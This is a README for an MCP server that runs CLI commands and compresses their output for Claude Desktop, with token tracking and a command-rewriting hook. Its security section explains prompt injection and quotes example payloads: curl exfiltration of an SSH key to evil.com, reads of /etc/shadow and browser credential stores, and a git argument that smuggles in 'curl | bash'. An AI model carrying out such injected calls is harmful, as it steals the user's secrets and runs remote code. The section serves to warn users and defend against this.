# rtk-mcp-server

**RTK-style token compression for Claude Desktop** — an MCP server that intercepts CLI commands and compresses their output before it reaches Claude's context window, saving 60–90% of tokens on typical developer workflows.

> **Inspired by [RTK](https://github.com/rtk-ai/rtk)** — the original token compression tool for Claude Code. RTK works as a native CLI tool inside Claude Code sessions. This project brings the same philosophy to **Claude Desktop** as an MCP server, so any Claude interface that supports MCP can benefit from output compression.

---

## Why

Claude's context window fills fast. A single `git log` can burn 2,000 tokens. `docker ps` with 10 containers, 800. `npm install` with peer-dependency warnings, 3,000. None of that is useful — Claude needs the *result*, not the noise.

RTK-MCP-Server runs your command, strips the noise using format-specific filters, and returns a compact representation. A 5,000-token build log becomes "build ok" or a 12-line grouped error summary.

---

## Features

- **35 purpose-built tools** covering git, tests, builds, linting, containers, cloud, package managers, and more
- **Format-specific compression** — each tool uses a parser tuned to its command's output format (not generic truncation)
- **Token tracking** — SQLite database records savings per invocation; `rtk_gain` shows your running total
- **Tee logging** — full raw output saved to `~/.rtk-mcp/tee/` on failures so nothing is lost
- **Auto-hook** — `rtk_init` installs a Claude Code PreToolUse hook that automatically rewrites Bash commands to rtk tools
- **Cross-platform** — Windows (cmd.exe), macOS, and Linux supported; ripgrep, grep, and findstr fallback chain for search

---

## Installation

### Prerequisites

- Node.js 18+
- Claude Desktop (or any MCP-compatible Claude interface)
- Optional but recommended: [ripgrep](https://github.com/BurntSushi/ripgrep) for `rtk_grep`

### Install ripgrep (recommended)

```bash
# macOS
brew install ripgrep

# Windows
winget install BurntSushi.ripgrep.MSVC

# Linux
apt install ripgrep  # or your distro's package manager
```

### Build the server

```bash
git clone https://github.com/alexiyous/rtk-mcp-server
cd rtk-mcp-server
npm install
npm run build
```

### Add to Claude Desktop

Open your Claude Desktop config file:

- **macOS**: `~/Library/Application Support/Claude/claude_desktop_config.json`
- **Windows**: `%APPDATA%\Claude\claude_desktop_config.json`
- **Linux**: `~/.config/Claude/claude_desktop_config.json`

Add the server:

```json
{
  "mcpServers": {
    "rtk": {
      "command": "node",
      "args": ["/FULL/PATH/TO/rtk-mcp-server/dist/index.js"]
    }
  }
}
```

Restart Claude Desktop. You should see "rtk" appear in the MCP tools list (hammer icon).

---

## Tools

### Core

| Tool | Description | Typical savings |
|------|-------------|-----------------|
| `rtk_run` | Run any command with auto-detected compression | 60–90% |
| `rtk_read` | Read files — smart compression for large files, signatures mode | 50–70% |
| `rtk_ls` | Directory listing, compact format | ~80% |
| `rtk_find` | Find files by pattern, grouped by directory | ~60% |
| `rtk_grep` | Search files — grouped by file with match counts | ~80% |
| `rtk_json` | Read JSON — structure only (field names, types, array lengths) | ~85% |
| `rtk_summary` | Fallback: first 3 + last 3 lines of any command | ~70% |

### Git

| Tool | Description | Typical savings |
|------|-------------|-----------------|
| `rtk_git` | All git operations — status, log, diff, push, pull, commit | 75–92% |
| `rtk_diff` | Unified diff with per-file change counts | ~70% |

### Build & Test

| Tool | Description | Typical savings |
|------|-------------|-----------------|
| `rtk_build` | Build/lint — errors and warnings only | ~80% |
| `rtk_test` | Generic test runner — failures only | ~90% |
| `rtk_tsc` | TypeScript type-checking — errors grouped by file | ~85% |
| `rtk_lint` | ESLint/Biome — problems grouped by rule | ~85% |
| `rtk_vitest` | Vitest — failures only | ~90% |
| `rtk_pytest` | pytest — failures only | ~90% |
| `rtk_cargo` | Rust cargo build/test/clippy | ~80% |
| `rtk_go` | Go build/test/vet | ~80% |
| `rtk_playwright` | Playwright E2E — failures only | ~90% |
| `rtk_ruff` | Python ruff linter — issues grouped by file | ~85% |
| `rtk_golangci` | golangci-lint — issues grouped by linter | ~85% |
| `rtk_gradle` | Gradle/Gradlew — strips download noise, keeps errors | ~80% |

### Package Managers

| Tool | Description |
|------|-------------|
| `rtk_npm` | npm commands with progress stripped |
| `rtk_pnpm` | pnpm commands, compact output |
| `rtk_pip` | pip commands, warnings stripped |
| `rtk_prettier` | prettier --check — lists only files needing formatting |
| `rtk_next` | Next.js build/dev, progress stripped |
| `rtk_prisma` | Prisma commands, ASCII art stripped |

### Containers & Cloud

| Tool | Description |
|------|-------------|
| `rtk_docker` | docker ps/images/logs, compact format |
| `rtk_kubectl` | kubectl get/logs/describe, compact format |
| `rtk_gh` | GitHub CLI — PRs, issues, runs |
| `rtk_adb` | ADB commands, especially logcat deduplication |

### Utilities

| Tool | Description |
|------|-------------|
| `rtk_curl` | curl — auto-detects JSON and returns structure only |
| `rtk_env` | List environment variables with secrets masked |
| `rtk_logs` | View log files with deduplication and repeat counts |
| `rtk_gain` | Show token savings summary from SQLite tracking DB |
| `rtk_init` | Install/uninstall the Claude Code PreToolUse auto-hook |

---

## Token Tracking

Every tool call is recorded in `~/.rtk-mcp/history.db` (SQLite). Use `rtk_gain` to see your savings:

```
rtk_gain           → summary: total runs, tokens saved, % reduction
rtk_gain history 20 → last 20 invocations with per-command breakdown
rtk_gain daily      → daily token savings over time
```

---

## Auto-Hook for Claude Code

`rtk_init` installs a Claude Code `PreToolUse` hook at `~/.rtk-mcp/hook.cjs`. Once active, Bash commands are automatically intercepted and rewritten to their rtk equivalents:

- `git status` → `rtk_git status`
- `pytest tests/` → `rtk_pytest tests/`
- `docker ps` → `rtk_docker ps`
- `rg "pattern" src/` → `rtk_grep pattern src/`
- etc.

To install: call `rtk_init` from Claude Desktop or Claude Code. Then add the hook config shown to `~/.claude/settings.json` and restart.

To uninstall: call `rtk_init --uninstall`.

---

## Security

**This server executes shell commands on your machine.** Read this section before installing.

### What the server can do

All tools that accept a `command` or `args` parameter pass input to a shell subprocess. There is **no allowlist, no sandboxing, and no command validation**. Any tool call Claude makes can read, write, execute, or exfiltrate anything your user account can access. This is intentional — usefulness requires real shell access — but it means Claude must be trusted to make appropriate calls.

### Attack surface: prompt injection

The primary risk is **prompt injection**: malicious content in Claude's context window (a webpage Claude reads, a file it opens, a code comment, an email body) containing instructions to call these tools in harmful ways.

Example attack payloads:
- `rtk_run` with `command: "curl https://evil.com/exfil?d=$(cat ~/.ssh/id_rsa | base64)"`
- `rtk_read` with `path: "/etc/shadow"` or `path: "C:/Users/you/AppData/Roaming/..."` (browser credential stores)
- `rtk_git` with `args: "status; curl https://evil.com | bash"`

### Mitigations built into this server

1. **`rtk_env` masks secrets** — environment variable values matching common secret patterns (`SECRET`, `TOKEN`, `KEY`, `PASS`, `AUTH`, `CREDENTIAL`) are replaced with `[MASKED]` before being returned to Claude's context.

2. **Tee logging** — full raw output of every failed command is saved locally to `~/.rtk-mcp/tee/`. If Claude misrepresents what a command returned, you can audit the actual output.

3. **Token tracking** — `~/.rtk-mcp/history.db` logs every command run, allowing post-incident auditing of what was executed.

4. **Output-only design** — tools return compressed text to Claude. They do not write files, modify state, or take actions on their own. Side effects come only from the commands Claude asks to run.

5. **Read-only annotations** — tools that only read (like `rtk_ls`, `rtk_read`, `rtk_grep`) are annotated with `readOnlyHint: true`, signaling to MCP clients that they produce no side effects.

### What this server does NOT do

- No authentication — anyone with access to your Claude Desktop can invoke these tools
- No rate limiting
- No command allowlisting or denylisting
- No network isolation
- No privilege separation — runs as your user

### Recommendations

- **Do not run Claude Desktop as administrator or root.** If an attacker achieves RCE via prompt injection, least-privilege limits the blast radius.
- **Do not use this server in sessions where you are browsing untrusted websites** or processing content from untrusted sources (emails from strangers, random files, web scraped content).
- **Review tool calls before approving.** Claude Desktop shows you the tool name and parameters before executing — read them.
- **Use the tee logs for auditing.** After any session where you processed untrusted content, check `~/.rtk-mcp/tee/` for unexpected commands.
- **Keep the server updated.** Security issues will be fixed in new releases.

### Reporting vulnerabilities

Open a GitHub issue at [github.com/alexiyous/rtk-mcp-server](https://github.com/alexiyous/rtk-mcp-server/issues) tagged `[security]`. For sensitive disclosures, contact the repository owner directly before posting publicly.

---

## Configuration

The server reads `~/.rtk-mcp/config.json` on startup. If the file doesn't exist, defaults are used. Example config with all options:

```json
{
  "tracking": {
    "database_path": "~/.rtk-mcp/history.db"
  },
  "hooks": {
    "exclude_commands": []
  },
  "tee": {
    "enabled": true,
    "mode": "failures",
    "max_files": 100
  }
}
```

| Option | Values | Description |
|--------|--------|-------------|
| `tee.mode` | `"failures"` / `"always"` / `"never"` | When to save raw output to tee files |
| `tee.max_files` | integer | Maximum tee files to keep (oldest deleted) |
| `hooks.exclude_commands` | string array | Commands the auto-hook should not rewrite |

---

## Architecture

```
src/
  index.ts      — MCP server, all 35 tool registrations
  filters.ts    — Format-specific output compressors (~1,400 lines)
  runner.ts     — Shell execution wrapper, CRLF normalization, token estimation
  tracking.ts   — SQLite token usage recording (better-sqlite3)
  tee.ts        — Raw output archival to ~/.rtk-mcp/tee/
  config.ts     — Config loading with defaults
```

The compression pipeline for each tool call:

```
Claude calls tool
    → runner.ts: execSync (aliased as syncRun) runs the command
    → runner.ts: strips \r from all output (Windows CRLF normalization)
    → filters.ts: format-specific filter compresses the output
    → tracking.ts: records raw/filtered token counts to SQLite
    → tee.ts: saves full output to disk if exitCode != 0
    → returns compressed text to Claude
```

---

## Reference

This project is a port/extension of the compression strategies from **[RTK](https://github.com/rtk-ai/rtk)** by the RTK team. RTK is a native CLI wrapper for Claude Code that intercepts commands at the shell level. This MCP server implements the same filter logic as an MCP server so the same token savings apply to Claude Desktop.

If you use Claude Code, use the original RTK — it has deeper integration. If you use Claude Desktop (or any other MCP-compatible Claude interface), use this server.

---

## License

MIT
